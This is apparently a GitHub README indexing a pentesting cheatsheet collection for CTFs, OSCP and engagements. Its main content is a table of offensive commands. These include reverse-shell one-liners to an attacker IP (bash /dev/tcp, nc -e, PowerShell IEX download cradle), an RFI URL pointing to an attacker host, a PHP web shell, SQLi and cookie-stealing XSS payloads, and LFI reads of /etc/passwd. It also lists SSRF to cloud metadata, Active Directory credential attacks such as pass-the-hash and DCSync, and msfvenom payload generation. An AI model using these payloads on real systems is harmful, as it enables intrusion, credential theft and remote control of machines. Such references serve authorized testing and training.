# Cybersecurity-Cheatsheets

Welcome! This repository contains a curated collection of cheatsheets and personal notes on cybersecurity, pentesting, and ethical hacking.
They are designed to be a quick reference during a CTF, a certification exam (like OSCP/OSCE), or a real-world pentesting engagement.

> load index.dat...

```bash
\$ tree .
.
├── LICENSE
├── README.md
├── 📂 Enumeration
│   ├── Nmap.md
│   ├── Recon-Web.md
│   └── SMB-LDAP.md
├── 📂 Web-Pentesting
│   ├── SQLi.md
│   ├── XSS.md
│   ├── LFI-RFI.md
│   └── SSRF-XXE.md
├── 📂 Priv-Escalation
│   ├── Linux.md
│   └── Windows.md
├── 📂 Active-Directory
│   ├── Kerberos.md
│   ├── Credential-Attacks.md
│   └── Bloodhound.md
├── 📂 Shells
│   ├── Reverse-Shells.md
│   ├── TTY-Upgrade.md
│   └── Web-Shells.md
└── 📂 Red-Teaming
    ├── C2-Frameworks.md
    ├── Payload-Generation.md
    └── Persistence.md
```

#Detailed Content Index

| Category                | Key Topics, Techniques, and Commands (Examples)                                                                                                                                                                                                 | Quick Link |
|-------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------|
| **📍 Enumeration**       | • **Network Scanning:**<br>`nmap -sC -sV -p- <ip>` (Base scan)<br>`nmap -sU` (UDP Scan)<br>`masscan -p1-65535 <ip> --rate=1000`<br>• **Web Enumeration:**<br>`gobuster dir -u <url> -w <list>`<br>`feroxbuster -u <url> -w <list>`<br>`nikto -h <url>` (Vulnerability scanner)<br>`whatweb <url>` (Technology identification)<br>• **SMB/Windows Enumeration:**<br>`enum4linux -a <ip>`<br>`smbclient -L //<ip>`<br>`nbtscan <ip-range>`<br>• **DNS/Subdomain Enumeration:**<br>`dig axfr @<dns-server> <domain>`<br>`subfinder -d <domain>` | [View Section](#) |
| **🌐 Web Pentesting**    | • **SQL Injection (SQLi):**<br>`sqlmap -u "<url>" --dbs --batch`<br>Comments: `' OR 1=1 -- - /`<br>`' OR 1=1 #`<br>Stacking: `'; COMMAND --`<br>• **Cross-Site Scripting (XSS):**<br>Reflected: `<script>alert(1)</script>`<br>Stored: `"><img src=x onerror=alert(document.cookie)>`<br>Filter Bypass (e.g., `onmouseover`)<br>• **File Inclusion (LFI / RFI):**<br>LFI: `../../etc/passwd`<br>PHP Wrappers: `php://filter/convert.base64-encode/resource=`<br>RFI: `http://<attacker-ip>/shell.txt?`<br>• **Server-Side Request Forgery (SSRF):**<br>Metadata Access (AWS, GCP): `http://169.254.169.254/`<br>Internal Port Scan: `http://localhost:22`<br>• **Other Vulnerabilities:**<br>XXE (XML External Entity)<br>Insecure Deserialization<br>OS Command Injection | [View Section](#) |
| **📈 Priv. Escalation**  | • **Linux:**<br>SUID Binaries: `find / -perm -u=s -type f 2>/dev/null`<br>(GTFOBins: find, cp, nmap...)<br>Cron Jobs: `ls -la /etc/cron.d`<br>Capabilities: `getcap -r / 2>/dev/null`<br>`sudo -l` (Sudo rules)<br>Kernel Exploits (LinPEAS / Linux-Exploit-Suggester)<br>• **Windows:**<br>Services (Weak Permissions, Unquoted Paths):<br>`sc qc <servicename>`<br>`icacls <service_binary>`<br>Tokens: `incognito.exe`, `JuicyPotato.exe`<br>DLL Hijacking<br>AutoRuns / Registry Keys<br>Files (Unattend.xml, SAM/SYSTEM backup) | [Linux](#) / [Windows](#) |
| **💻 Active Directory**  | • **Initial Enumeration:**<br>PowerView: `Get-NetUser`, `Get-NetGroup`<br>BloodHound (Ingestors: SharpHound.exe / .ps1)<br>• **Kerberos Attacks:**<br>Kerberoasting: `GetUserSPNs.py` (impacket)<br>AS-REP Roasting: `GetNPUsers.py` (impacket)<br>• **Credential Attacks:**<br>Pass-the-Hash (PtH): `psexec.py <user>@<ip>`<br>Pass-the-Ticket (PtT)<br>Golden / Silver Tickets (Mimikatz)<br>• **Lateral Movement & Dominance:**<br>DCSync (krbtgt hash)<br>`evil-winrm -i <ip> -u <user> -p <pass>` | [View Section](#) |
| **🐚 Shells & TTYs**     | • **Reverse Shells (One-liners):**<br>Bash: `bash -i >& /dev/tcp/<ip>/<port> 0>&1`<br>Python: `python -c 'import socket...'`<br>PowerShell: `IEX (New-Object Net.WebClient)...`<br>Netcat: `nc -e /bin/bash <ip> <port>`<br>• **Listeners:**<br>`nc -lvnp <port>`<br>`rlwrap nc -lvnp <port>` (with history)<br>`socat file:tty,raw,echo=0 tcp-listen:<port>`<br>• **Full TTY Upgrade:**<br>1. `python -c 'import pty; pty.spawn("/bin/bash")'`<br>2. Ctrl+Z (background)<br>3. `stty raw -echo; fg`<br>4. `export TERM=xterm`<br>• **Web Shells:**<br>PHP: `<?php system($_GET['cmd']); ?>`<br>ASXP: (e.g., Antak, Weevely) | [View Section](#) |
| **🔴 Red Teaming**        | • **C2 Frameworks:**<br>Metasploit: `multi/handler`, Meterpreter<br>Cobalt Strike (Malleable C2 profiles)<br>Empire (PowerShell / Python)<br>• **Payload Generation:**<br>`msfvenom -p <payload> LHOST=... LPORT=... -f <format>`<br>Staged vs. Stageless<br>Shellcode (C#, VBA)<br>• **Defense Evasion:**<br>AMSI Bypass (PowerShell)<br>Payload Obfuscation<br>Living Off The Land (LOLBAS): certutil, bitsadmin | [View Section](#) |
